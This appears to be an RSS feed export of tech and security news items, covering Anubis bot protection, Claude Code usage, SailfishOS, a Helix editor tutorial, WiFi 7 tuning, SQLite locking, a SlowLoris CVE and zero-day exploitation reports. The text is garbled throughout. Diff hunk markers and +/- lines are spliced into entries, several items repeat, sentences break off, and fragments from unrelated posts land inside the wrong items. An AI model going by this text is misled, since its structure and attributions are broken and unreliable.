Anubis</title><link>https://fxgn.dev/blog/anubis/</link><author>flexagoon</author><category>dev</category><pubDate>Sun, 2 Nov 2025 04:03:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[This has led to more and more websites using Anubis, a proof-of-work based bot protection solution that requires all visitors to solve a small cryptographic problem on their device before proceeding.But here’s the thing:  Well, alright, it does - it can be a good DDoS protection solution, especially for people who don’t want to use Cloudflare. But it seems like most users of Anubis don’t need DDoS protection - only protection agaist agressive LLM scrapers. And if that’s your only usecase, you probably .People often claim that Anubis stops bots by making it too computationally expensive to access your website. Unfortunately, the price LLM companies would have to pay to scrape every single Anubis deployment out there is approximately $0.00.But it still works, right? People use Anubis because it actually stops LLM bots from scraping their site, so it must work, right?Yeah, but only because the LLM bots simply .Yes, it works, and does so as effectively as Anubis, while not bothering your visitors with a 10-second page load time.In most cases, you should not need this and can probably get by using Cloudflare to protect a given origin. However, for circumstances where you can’t or won’t use Cloudflare, Anubis is there for you.I get that many people are strongly against Cloudflare’s internet monopoly, and I don’t blame them for using solutions like Anubis to protect their sites against real attacks. I’m also obviously not trying to throw shade on the Anubis project or its developers. I think it has a use as a DDoS protection solution - it’s just extremely overused by people who don’t need it.So if your only concern is ClaudeBot, which seems to be the case for most of the websites that use Anubis, please, go and replace your annoying stopgap solution with a non-annoying one.]]></content:encoded></item><item><title>How I use every Claude Code feature</title><link>https://blog.sshh.io/p/how-i-use-every-claude-code-feature</link><author>sshh12</author><category>dev</category><pubDate>Sun, 2 Nov 2025 00:13:27 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I use Claude Code. A lot.--dangerously-skip-permissionsseveral billion tokens per monthThe CLI agent space is getting crowded and between Claude Code, Gemini CLI, Cursor, and Codex CLI, it feels like the real race is between Anthropic and OpenAI. But TBH when I talk to other developers, their choice often comes down to what feels like superficials—a “lucky” feature implementation or a system prompt “vibe” they just prefer. At this point these tools are all pretty good. I also feel like folks often also over index on the output style or UI. Like to me the “you’re absolutely right!” sycophancy isn’t a notable bug; it’s a signal that you’re too in-the-loop. Generally my goal is to “shoot and forget”—to delegate, set the context, and let it work. Judging the tool by the final PR and not how it gets there.This post ended up a bit long and I’d recommend it as more of a reference than something to read in entirety. How you treat this file depends on the context. For my hobby projects, I let Claude dump whatever it wants in there.It only documents tools and APIs used by 30% (arbitrary) or more of our engineers (else tools are documented in product or library specific markdown files)Start with Guardrails, Not a Manual.Here’s a simplified snapshot:# Monorepo
 
 ## Python
 - Always ...
@@ -880,7 +880,9 @@ For <complex usage> or <error> see path/to/<tool>_docs.md
 [16.04.2020] – Version 0.9 was released
 [21.01.2020] – Version 0.85 was released
 [15.05.2019] – Version 0.84 was released
-[09.08.2018] – Version 0.83 was released]]></content:encoded></item><item><title>SailfishOS: A Linux-based European alternative to dominant mobile OSes</title><link>https://sailfishos.org/info/</link><author>ForHackernews</author><category>dev</category><pubDate>Sat, 1 Nov 2025 22:05:00 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Sailfish OS’s heritage lies in Nokia times, especially in the MeeGo operating system. Prior to 2011 Nokia and Intel had a vision of an open mobile operating system. Together they invested around 1 billion USD to the project and created an open source based operating system called MeeGo, which was used as a basis for several devices, such as the iconic Nokia N9. Although the Nokia N9 became the beacon of open source operating systems, Nokia decided to end the project and chose instead to continue with Microsoft’s Windows Phone OS. The rest of that is another story.The passionate team behind MeeGo refused to quit working on the project they’ve believed in. They, or currently ‘we’ saved MeeGo by setting up a new company, Jolla Ltd., to develop the swipe-based MeeGo into the flowing user experience that is Sailfish OS. We quickly enhanced Sailfish OS to run Android apps and it became hardware compatible with Android chipsets. In November 2013, we launched the beta version of Sailfish OS to the market with the Jolla smartphone. Shortly after this, we released Sailfish OS version 1.0 and the first Sailfish OS product, the Jolla smartphone entered 36 markets during one year. In 2015, Sailfish OS 2.0. was released along with the Jolla Tablet, and a strengthened focus on the company’s licensing strategy.In 2018 Sailfish OS matured to its third generation offering a packetized, secure solution for various corporate and governmental environments, and a smooth and secure mobile OS for tech-savvy consumers through the Sailfish X community program. The fourth generation, Sailfish 4, introduced in February 2021, boasts a multitude of new enablers to support different ecosystem projects, be it private corporate solutions or public sector governmental deployments.]]></content:encoded></item><item><title>Veradigm’s Breach Claims Under Scrutiny After Dark Web Leak</title><link>https://databreaches.net/2025/11/01/veradigms-breach-claims-under-scrutiny-after-dark-web-leak/?pk_campaign=feed&amp;pk_kwd=veradigms-breach-claims-under-scrutiny-after-dark-web-leak</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 1 Nov 2025 20:04:21 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Beginner-friendly, unofficial documentation for Helix text editor</title><link>https://helix-editor.vercel.app/start-here/basics/</link><author>Curiositry</author><category>dev</category><pubDate>Sat, 1 Nov 2025 19:33:48 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Create a new text file and open it with Helix by running . This is what you’ll see:Notice the  in the bottom-left corner, this indicates that you are currently in Normal mode. In this mode, typing letters like  and  won’t insert them as text, but rather have specific  which we will explore later.To actually insert some text, press , which is the command to get into Insert mode, indicated by the  in the bottom-left corner. In this mode, the letters you type will be inserted directly into the document.Try it out by writing .To get back into Normal mode press . This will change the color of your cursor and you will see  again, indicating that you are in normal mode now.To move your cursor you could use arrow keys, both in Normal and Insert modes:However, this isn’t encouraged due to the fact that hand will be doing a lot of back-and-forth movement between the arrow keys and the keyboard.Instead, it is recommended to rest your fingers on the “home row”, which is comprised of the row of keys .Instead of stretching to reach the arrow keys, use normal mode and , ,  and  to move your cursor:: moves cursor 1 character to the left.: moves cursor 1 line above.: moves cursor 1 line below.: moves cursor 1 character to the right.Try holding down  and  to move horizontally across the text you just wrote!We only have one line of text, so let’s duplicate it several times. Type:, which will select the entire line., which will  (copy) the selection to clipboard., which will paste the contents of the selection after the cursor.Spam  a few times to create several lines.Now you can try using the , ,  and  motions to traverse the text!Let’s say we want to replace one of the  words with . To do this, place your cursor on one of the  letters: is a motion which moves to the  of the current word. Type  and it will move your cursor to the end of the .It doesn’t just move your cursor there, though. The entire  word becomes highlighted:If we now press , which moves to the  of the current word, it’ll move us back to where we just were.Try this out a few times, press  and then  to select various sections of the text. If you want to remove your selection press .Let’s highlight our  word again:Helix’s philosophy is that each  will act on a selection.Every time text is modified (an ), you will fully anticipate the result — because you can clearly see the area of text which is highlighted, and thus will be modified.For example, we currently have the word  selected. To change it to , press , removes the contents of the current selection and places us in Insert mode, where you can then write your new word. Exit back to Normal mode by pressing .The  command deletes the current selection and copies what has been deleted into a clipboard.Let’s test it out by doing the following:Select the line we just changed with .Spam  a few times to create some duplicates.Let’s remove all of our previous  by doing the following for each  line:Now we have something like this:What if we made a mistake, and want to go back? The  command will  our most recent action. It’s similar to  +  in other editors.Try pressing down  a few times to get to our previous state, before we made all those modifications: is similar to  +  +  in other editors. It will . It’s the inverse of .Press  until we get back to our most recent state:Feel free to make modifications to your file using the commands we have learned so far:, ,  and  moves 1 character left, down, up and right. selects the entire line. pastes the recently copied selection. selects and moves to the end of the current word. selects and moves to the beginning of the current word. removes the extra selection. deletes the current selection, without exiting Normal mode. changes the current selection, by deleting it and entering Insert mode. will undo the most recent change. will undo the most recent undo.Once you are happy with your modifications, enter Normal mode and type . enters , which has commands you type out. will  the current file. will  the current file. will quit without saving. will both write and quit.Let’s try out more Helix commands! Open the file again with . Select the entire file by pressing Now, delete the selection with .Using  to go to the beginning of the word and  to go to the end is useful if you are already at the word you want. But if you are far away, a very powerful command is  — . will create two letters at the start of every word in sight. When you type those two letters, you instantly jump to the specified word.Let’s say we want to jump to the  word. The first two characters have been replaced by  and highlighted. If we write , we will highlight that word!You can also replace a selection with contents of a register.Select the  word by using  and yank it with .Select the  word and replace it with  with .Go to the first line by using .To search for a word, use  command. Type  which is going to highlight the next  keyword, and then  to select it.Since there are several s in the text, you can cycle between them: cycles to the next match. cycles to the previous match.Select the  word using . If you press , you will go into insert mode at the beginning of the selection. There are also 5 more ways to enter Insert mode: for  go into insert mode at the end of the selection go into insert mode at the beginning of the current line to append at the end of the current line add a newline below and go into insert mode add a newline above and go into insert modeHelix has a concept called , which is like having many clipboards at once.To interact with them, prefix yank and delete commands with a  and then the name of the register.For example, the contents of the system clipboard are stored inside the  register.Paste the following content into the file with :Navigate to the last line by using  for .Select the last line with  and then yank it with .Navigate to the second line by using .Select the second line by using  and then yank into into the  register with .Navigate to the third line by using .Paste what we copied previously by using .Notice how we haven’t pasted the 2nd line’s contents, but rather the last lines’? Because we yanked the 2nd line’s contents into the  register. To paste from it, use . signals to the editor that we are going to use a register. pastes contents of the  register.Take note of the fact that when we press , it pastes the contents of the register  the line. To paste , we undo with  and use  to paste before.You can also search for individual characters by using , which stands for .Select the entire file with Override the selection by using  + .Go to the first line with  and use  to go to the next semicolon. Repeat this several several times.To move in the opposite direction, use  to the previous semicolon.Using  and  motions will move your cursor  the next or the previous occurrence of the character.For example,  to go to the next e.  to go to just before the previous double-quote.The  for  is similar to , but instead it places your cursor  the occurrence of the character. Try using  several times.  goes the opposite way.Each motion also accepts an optional , which defaults to 1 if you don’t provide it.For example, use  which would be the same as .Or  which would be the same as .Currently the text is fairly short, but we can fix that. Select everything with , yank  and then paste it 100 times with . This will create a very big file.We can use these commands to scroll large chunks of text at once: +  to scroll down half a page +  to scroll up half a pageNow you know the basics of movement in Helix, it’s time to learn about the more advanced features Helix provides.]]></content:encoded></item><item><title>CVE-2025-12601 - Denial of Service Due to SlowLoris</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12601</link><author></author><category>vulns</category><pubDate>Sat, 1 Nov 2025 18:49:12 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12601
+[09.08.2018] – Version 0.83 was released]]></content:encoded></item><item><title>SailfishOS: A Linux-based European alternative to dominant mobile OSes</title><link>https://sailfishos.org/info/</link><author>ForHackernews</author><category>dev</category><pubDate>Sat, 1 Nov 2025 22:05:00 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Sailfish OS’s heritage lies in Nokia times, especially in the MeeGo operating system. Prior to 2011 Nokia and Intel had a vision of an open mobile operating system. Together they invested around 1 billion USD to the project and created an open source based operating system called MeeGo, which was used as a basis for several devices, such as the iconic Nokia N9. Although the Nokia N9 became the beacon of open source operating systems, Nokia decided to end the project and chose instead to continue with Microsoft’s Windows Phone OS. The rest of that is another story.The passionate team behind MeeGo refused to quit working on the project they’ve believed in. They, or currently ‘we’ saved MeeGo by setting up a new company, Jolla Ltd., to develop the swipe-based MeeGo into the flowing user experience that is Sailfish OS. We quickly enhanced Sailfish OS to run Android apps and it became hardware compatible with Android chipsets. In November 2013, we launched the beta version of Sailfish OS to the market with the Jolla smartphone. Shortly after this, we released Sailfish OS version 1.0 and the first Sailfish OS product, the Jolla smartphone entered 36 markets during one year. In 2015, Sailfish OS 2.0. was released along with the Jolla Tablet, and a strengthened focus on the company’s licensing strategy.In 2018 Sailfish OS matured to its third generation offering a packetized, secure solution for various corporate and governmental environments, and a smooth and secure mobile OS for tech-savvy consumers through the Sailfish X community program. The fourth generation, Sailfish 4, introduced in February 2021, boasts a multitude of new enablers to support different ecosystem projects, be it private corporate solutions or public sector governmental deployments.]]></content:encoded></item><item><title>Veradigm’s Breach Claims Under Scrutiny After Dark Web Leak</title><link>https://databreaches.net/2025/11/01/veradigms-breach-claims-under-scrutiny-after-dark-web-leak/?pk_campaign=feed&amp;pk_kwd=veradigms-breach-claims-under-scrutiny-after-dark-web-leak</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 1 Nov 2025 20:04:21 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>From 400 Mbps to 1.7 Gbps: A WiFi 7 Debugging Journey</title><link>https://blog.tymscar.com/posts/wifi7speedhunt/</link><author>tymscar</author><category>dev</category><pubDate>Sat, 1 Nov 2025 19:50:03 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I recently upgraded from a UniFi Dream Machine to a UniFi Dream Router 7 because I’m getting 2.5 Gbps internet in two weeks and figured I’d jump on the WiFi 7 bandwagon while I’m at it. My iPhone 17 Pro Max supports it, so why not? After setting everything up, I was getting nowhere near the speeds I expected. Time for some debugging.The disappointing numbers#My wired connection was pulling 950 Mbps through a 1 Gbps switch, and iperf3 directly to the UDR7’s 2.5 Gbps port showed around 2.3 Gbps. The backbone was solid. But on WiFi 7 (6 GHz, 160 MHz width), standing literally a foot from the router, I was getting around 400 Mbps with iperf3. With 10 concurrent streams it went up to 650 Mbps, but that’s still pathetic.A quick note on my testing: I was using iperf3’s  flag (reverse mode) which makes the server send data to the client instead of the other way around. This typically gives better results on WiFi since the AP has stronger transmit power than phones, and the phone only needs to send tiny ACKs back.False start #1: “Maybe I’m testing wrong”#I created a dedicated 6 GHz-only network with 160 MHz channel width on Auto transmit power. The spectrum was clean with no other 6 GHz broadcasts. I wondered if maybe 160 MHz was causing issues, so I tried switching to 80 MHz width to test that theory - but that made things worse at 374 Mbps total. So it wasn’t that 160 MHz was broken; something else was going on. Moving the iperf server from the UDR itself to my MacBook over Ethernet improved things to 727 Mbps, but still nowhere near the expected speeds.Finding the first bottleneck#After banging my head against this for hours, I had a hypothesis about my test setup. My wired MacBook could hit 2.3 Gbps to the router, so the network was fine. But looking at my iperf3 results when testing WiFi against 10.0.0.1 (the router itself), I wondered if that was the issue:Running iperf server on the router itself creates CPU contention between the WiFi scheduling and the iperf process. The router’s TCP stack isn’t tuned for this either. Classic mistake.False start #2: “It’s a 2.5 GbE problem”#Moved the iperf server to my MacBook connected through a USB-C 2.5 GbE adapter. Verified the port negotiated at 2.5G in UniFi’s port settings. Ran the test again:Better, but still nowhere close to 1.9 Gbps. Time to check what UniFi was actually showing for the client connection during the test. That’s when I found the real problem.The actual issue: 80 MHz, not 160 MHz#Looking at the UniFi client details while running iperf, I saw this:Ch. 37 (6 GHz, 80 MHz)
+Tx/Rx Rate: 1.20 Gbps
+Wait, what? My iPhone was connecting at 80 MHz channel width, not 160 MHz. Even though I had configured the SSID for 160 MHz, the actual radio was still on 80 MHz. The 1.20 Gbps PHY rate is exactly what you’d expect for 2×2 MIMO at 80 MHz. That explained the 650-900 Mbps TCP throughput perfectly. When I had manually tested 80 MHz earlier and got worse speeds (374 Mbps), it was probably due to testing against the router itself rather than the channel width.The fix was in the UDR7’s radio settings, not the SSID settings. I went to:Devices → UDR7 → Radios → 6 GHzSet channel width explicitly to 160 MHz (not Auto)Set transmit power to HighThe working configuration#After applying those changes and reconnecting:Finally! The UniFi panel now showed:That’s exactly the expected PHY rate for 2×2 WiFi 7 at 160 MHz with 4096-QAM.Why certain iperf flags matter#During this journey I learned why specific iperf3 flags make such a huge difference:: As I mentioned earlier, this is crucial for WiFi testing. It’s faster because:The AP has higher transmit power and better antennasThe phone only has to send tiny ACKs backiOS’s TCP receive path is better optimized than its send pathPhones transmit at much lower power on 6 GHz: Overcomes single-flow TCP limitations like slow start, congestion window, and socket buffer limits. Four to eight streams usually hit peak; more gives diminishing returns.: Less critical on LAN where RTT is tiny, but can help with bursty traffic.Why no 2×2 client hits 2.5 Gbps on WiFi#Even with everything optimized, I’ll never see 2.5 Gbps on my phone. Here’s why:The fastest PHY a 2×2 client can negotiate on 160 MHz WiFi 7 is about 2.88 Gbps (4096-QAM, MCS13). But that’s the raw link rate. After overhead:MAC/PHY overhead (preambles, pilots, guard intervals, CSMA/CA backoff, block ACKs)Best-case TCP “goodput” is typically 60-75% of PHY on a clean single-client link. So 60-75% of 2.88 Gbps gives you roughly 1.7-2.1 Gbps. That’s why reviews land around 1.6-1.9 Gbps.To exceed 2.0-2.1 Gbps you’d need:320 MHz channels (not supported on iPhones)More spatial streams (3×3 or 4×4, but phones are 2×2)WiFi 7 MLO using multiple bands simultaneouslyFor anyone else trying to maximize their WiFi 7 speeds:Don’t test against the router itself - Use a separate machine on >=2.5 GbECheck your actual channel width - The client details panel tells the truth, not the SSID settingsSet transmit power to High for testing - But use Auto/Medium for daily use to avoid uplink/downlink imbalanceUse reverse mode with multiple streams - iperf3 -c <server> -P 6 -R -t 20 - Too close can hurt signal qualityAfter all this debugging, I’m now consistently seeing 1.6-1.7 Gbps on WiFi 7 with my iPhone. Not quite the headline 1.9 Gbps some reviewers got, but definitely in the expected range for real-world performance. More importantly, I understand exactly why the numbers are what they are.Now I just need my ISP to actually deliver that 2.5 Gbps upgrade…]]></content:encoded></item><item><title>Beginner-friendly, unofficial documentation for Helix text editor</title><link>https://helix-editor.vercel.app/start-here/basics/</link><author>Curiositry</author><category>dev</category><pubDate>Sat, 1 Nov 2025 19:33:48 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Create a new text file and open it with Helix by running . This is what you’ll see:Notice the  in the bottom-left corner, this indicates that you are currently in Normal mode. In this mode, typing letters like  and  won’t insert them as text, but rather have specific  which we will explore later.To actually insert some text, press , which is the command to get into Insert mode, indicated by the  in the bottom-left corner. In this mode, the letters you type will be inserted directly into the document.Try it out by writing .To get back into Normal mode press . This will change the color of your cursor and you will see  again, indicating that you are in normal mode now.To move your cursor you could use arrow keys, both in Normal and Insert modes:However, this isn’t encouraged due to the fact that hand will be doing a lot of back-and-forth movement between the arrow keys and the keyboard.Instead, it is recommended to rest your fingers on the “home row”, which is comprised of the row of keys .Instead of stretching to reach the arrow keys, use normal mode and , ,  and  to move your cursor:: moves cursor 1 character to the left.: moves cursor 1 line above.: moves cursor 1 line below.: moves cursor 1 character to the right.Try holding down  and  to move horizontally across the text you just wrote!We only have one line of text, so let’s duplicate it several times. Type:, which will select the entire line., which will  (copy) the selection to clipboard., which will paste the contents of the selection after the cursor.Spam  a few times to create several lines.Now you can try using the , ,  and  motions to traverse the text!Let’s say we want to replace one of the  words with . To do this, place your cursor on one of the  letters: is a motion which moves to the  of the current word. Type  and it will move your cursor to the end of the .It doesn’t just move your cursor there, though. The entire  word becomes highlighted:If we now press , which moves to the  of the current word, it’ll move us back to where we just were.Try this out a few times, press  and then  to select various sections of the text. If you want to remove your selection press .Let’s highlight our  word again:Helix’s philosophy is that each  will act on a selection.Every time text is modified (an ), you will fully anticipate the result — because you can clearly see the area of text which is highlighted, and thus will be modified.For example, we currently have the word  selected. To change it to , press , removes the contents of the current selection and places us in Insert mode, where you can then write your new word. Exit back to Normal mode by pressing .The  command deletes the current selection and copies what has been deleted into a clipboard.Let’s test it out by doing the following:Select the line we just changed with .Spam  a few times to create some duplicates.Let’s remove all of our previous  by doing the following for each  line:Now we have something like this:What if we made a mistake, and want to go back? The  command will  our most recent action. It’s similar to  +  in other editors.Try pressing down  a few times to get to our previous state, before we made all those modifications: is similar to  +  +  in other editors. It will . It’s the inverse of .Press  until we get back to our most recent state:Feel free to make modifications to your file using the commands we have learned so far:, ,  and  moves 1 character left, down, up and right. selects the entire line. pastes the recently copied selection. selects and moves to the end of the current word. selects and moves to the beginning of the current word. removes the extra selection. deletes the current selection, without exiting Normal mode. changes the current selection, by deleting it and entering Insert mode. will undo the most recent change. will undo the most recent undo.Once you are happy with your modifications, enter Normal mode and type . enters , which has commands you type out. will  the current file. will  the current file. will quit without saving. will both write and quit.Let’s try out more Helix commands! Open the file again with . Select the entire file by pressing Now, delete the selection with .Using  to go to the beginning of the word and  to go to the end is useful if you are already at the word you want. But if you are far away, a very powerful command is  — . will create two letters at the start of every word in sight. When you type those two letters, you instantly jump to the specified word.Let’s say we want to jump to the  word. The first two characters have been replaced by  and highlighted. If we write , we will highlight that word!You can also replace a selection with contents of a register.Select the  word by using  and yank it with .Select the  word and replace it with  with .Go to the first line by using .To search for a word, use  command. Type  which is going to highlight the next  keyword, and then  to select it.Since there are several s in the text, you can cycle between them: cycles to the next match. cycles to the previous match.Select the  word using . If you press , you will go into insert mode at the beginning of the selection. There are also 5 more ways to enter Insert mode: for  go into insert mode at the end of the selection go into insert mode at the beginning of the current line to append at the end of the current line add a newline below and go into insert mode add a newline above and go into insert modeHelix has a concept called , which is like having many clipboards at once.To interact with them, prefix yank and delete commands with a  and then the name of the register.For example, the contents of the system clipboard are stored inside the  register.Paste the following content into the file with :Navigate to the last line by using  for .Select the last line with  and then yank it with .Navigate to the second line by using .Select the second line by using  and then yank into into the  register with .Navigate to the third line by using .Paste what we copied previously by using .Notice how we haven’t pasted the 2nd line’s contents, but rather the last lines’? Because we yanked the 2nd line’s contents into the  register. To paste from it, use . signals to the editor that we are going to use a register. pastes contents of the  register.Take note of the fact that when we press , it pastes the contents of the register  the line. To paste , we undo with  and use  to paste before.You can also search for individual characters by using , which stands for .Select the entire file with Override the selection by using  + .Go to the first line with  and use  to go to the next semicolon. Repeat this several several times.To move in the opposite direction, use  to the previous semicolon.Using  and  motions will move your cursor  the next or the previous occurrence of the character.For example,  to go to the next e.  to go to just before the previous double-quote.The  for  is similar to , but instead it places your cursor  the occurrence of the character. Try using  several times.  goes the opposite way.Each motion also accepts an optional , which defaults to 1 if you don’t provide it.For example, use  which would be the same as .Or  which would be the same as .Currently the text is fairly short, but we can fix that. Select everything with , yank  and then paste it 100 times with . This will create a very big file.We can use these commands to scroll large chunks of text at once: +  to scroll down half a page +  to scroll up half a pageNow you know the basics of movement in Helix, it’s time to learn about the more advanced features Helix provides.]]></content:encoded></item><item><title>CVE-2025-12601 - Denial of Service Due to SlowLoris</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12601</link><author></author><category>vulns</category><pubDate>Sat, 1 Nov 2025 18:49:12 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12601
  Nov. 1, 2025, 7:15 p.m. | 17 hours, 16 minutes ago
 Denial of Service Due to SlowLoris.This issue affects BLU-IC2: through 1.19.5; BLU-IC4: through 1.19.5.
  10.0 | CRITICAL
@@ -951,7 +953,7 @@ Supported Package Managers, , Simple Questions That WorkJust ask Copilot Chat na
 Ensure GitHub Copilot is installed and activeReload VS Code ( → "Reload Window")Check Python version:  (should be 3.11+)First scan may take 10-20 seconds while installing dependenciesCheck your internet connection (needed for CVE databases)Ensure you have dependency files (package.json, requirements.txt, etc.)Try scanning again - APIs may have rate limitsPowered by NVD, OSV, and the Model Context Protocol]]></content:encoded></item><item><title>r/netsec monthly discussion &amp; tool thread</title><link>https://www.reddit.com/r/netsec/comments/1olp81v/rnetsec_monthly_discussion_tool_thread/</link><author>/u/albinowax</author><category>netsec</category><pubDate>Sat, 1 Nov 2025 14:29:03 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Questions regarding netsec and discussion related directly to netsec are welcome here, as is sharing tool links.Always maintain civil discourse. Be awesome to one another - moderator intervention will occur if necessary.Avoid NSFW content unless absolutely necessary. If used, mark it as being NSFW. If left unmarked, the comment will be removed entirely.If linking to classified content, mark it as such. If left unmarked, the comment will be removed entirely.Avoid use of memes. If you have something to say, say it with real words.All discussions and questions should directly relate to netsec.No tech support is to be requested or provided on r/netsec.As always, the content & discussion guidelines should also be observed on r/netsec.Feedback and suggestions are welcome, but don't post it here. Please send it to the moderator inbox.]]></content:encoded></item><item><title>China-linked hackers exploited Lanscope flaw as a zero-day in attacks</title><link>https://www.bleepingcomputer.com/news/security/china-linked-hackers-exploited-lanscope-flaw-as-a-zero-day-in-attacks/</link><author></author><category>security</category><pubDate>Sat, 1 Nov 2025 14:16:26 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
             China-linked cyber-espionage actors tracked as 'Bronze Butler' (Tick) exploited a Motex Lanscope Endpoint Manager vulnerability as a zero-day to deploy an updated version of their Gokcpdoor malware.
 T ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>ASD Warns of Ongoing BADCANDY Attacks Exploiting Cisco IOS XE Vulnerability</title><link>https://thehackernews.com/2025/11/asd-warns-of-ongoing-badcandy-attacks.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivjJxC82aGCds7xQg0mAqxFwkMrJCO3JdIyu5ShCl2QYOrnrJpOdBSnJdlnN1euQiL6blI-sBypwPP-nCcWSrkvxZkNGsH1yb9zE7bgLKXOpwFvit66JlEtekICCBuPxgMY6uYJaWAMyXYmAvvdsrdjoV6qzVdSyPUjzS332wVtMWxg4AaF2DTiYrfmQQM/s1600/cisco.jpg" length="" type=""/><pubDate>Sat, 1 Nov 2025 13:43:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The Australian Signals Directorate (ASD) has issued a bulletin about ongoing cyber attacks targeting unpatched Cisco IOS XE devices in the country with a previously undocumented implant known as BADCANDY.
-The activity, per the intelligence agency, involves the exploitation of CVE-2023-20198 (CVSS score: 10.0), a critical vulnerability that allows a remote, unauthenticated attacker to create an]]></content:encoded></item><item><title>SQLite concurrency and why you should care about it</title><link>https://jellyfin.org/posts/SQLite-locking/</link><author>HunOL</author><category>dev</category><pubDate>Sat, 1 Nov 2025 12:59:03 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[SQLite is a powerful database engine, but due to its design, it has limitations that should not be overlooked.Jellyfin has used a SQLite-based database for storing most of its data for years, but it has also encountered issues on many systems. In this blog post, I will explain how we address these limitations and how developers using SQLite can apply the same solutions.This will be a technical blog post intended for developers and everyone wanting to learn about concurrency.Also Jellyfin's implementation of locking for SQLite should be fairly easy to be implemented into another EF Core application if you are facing the same issue.SQLite is a file-based database engine running within your application and allows you to store data in a relational structure.
+The activity, per the intelligence agency, involves the exploitation of CVE-2023-20198 (CVSS score: 10.0), a critical vulnerability that allows a remote, unauthenticated attacker to create an]]></content:encoded></item><item><title>CharlotteOS – An Experimental Modern Operating System</title><link>https://github.com/charlotte-os/Catten</link><author>ementally</author><category>dev</category><pubDate>Sat, 1 Nov 2025 13:12:47 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>SQLite concurrency and why you should care about it</title><link>https://jellyfin.org/posts/SQLite-locking/</link><author>HunOL</author><category>dev</category><pubDate>Sat, 1 Nov 2025 12:59:03 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[SQLite is a powerful database engine, but due to its design, it has limitations that should not be overlooked.Jellyfin has used a SQLite-based database for storing most of its data for years, but it has also encountered issues on many systems. In this blog post, I will explain how we address these limitations and how developers using SQLite can apply the same solutions.This will be a technical blog post intended for developers and everyone wanting to learn about concurrency.Also Jellyfin's implementation of locking for SQLite should be fairly easy to be implemented into another EF Core application if you are facing the same issue.SQLite is a file-based database engine running within your application and allows you to store data in a relational structure.
 Overall it gives your application the means of storing structured data as a single file and without having to depend on another application to do so.
 Naturally this also comes at a price. If your application fully manages this file, the assumption must be made that your application is the sole owner of this file, and nobody else will tinker with it while you are writing data to it.So an application that wants to use SQLite as its database needs to be the only one accessing it.
 Having established this fact, an important thought arises: if only a single write operation should be performed on a single file at a time, this rule must also apply to operations within the same application.SQLite has a feature that tries to get around this limitation: the Write-Ahead-Log (WAL).
@@ -1265,7 +1267,65 @@ next state of particles. These buffers store data such as particle positions in 
 of GPU resources.Shader Programs for Particle Dynamics: The shader programs execute on the GPU and apply attractor dynamics to
 each particle. Following is the attractor function which update the particle positions based on the attractor equation.Rendering and Buffer Swapping: In each frame, the shader computes the new positions based on the attractor's
 equations and stores them in the inactive buffer. After updating, the roles of the FBOs are swapped: The previously
-inactive buffer becomes active, and vice versa.This combination of efficient shader calculations and the ping-pong technique allows us to render the particle system.If you have any comments, please leave them on this GitHub discussions topic. Sooner or later, I will integrate it with the blog. The  discussion can be found here.]]></content:encoded></item><item><title>S.A.R.C.A.S.M: Slightly Annoying Rubik&apos;s Cube Automatic Solving Machine</title><link>https://github.com/vindar/SARCASM</link><author>chris_overseas</author><category>dev</category><pubDate>Fri, 31 Oct 2025 23:03:18 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Friday Squid Blogging: Giant Squid at the Smithsonian</title><link>https://www.schneier.com/blog/archives/2025/10/friday-squid-blogging-giant-squid-at-the-smithsonian.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 31 Oct 2025 21:06:18 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[I can’t believe that I haven’t yet posted this picture of a giant squid at the Smithsonian.As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.]]></content:encoded></item><item><title>Two Windows vulnerabilities, one a 0-day, are under active exploitation</title><link>https://arstechnica.com/security/2025/10/two-windows-vulnerabilities-one-a-0-day-are-under-active-exploitation/</link><author></author><category>security</category><pubDate>Fri, 31 Oct 2025 21:03:56 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Two Windows vulnerabilities, one a 0-day, are under active exploitation
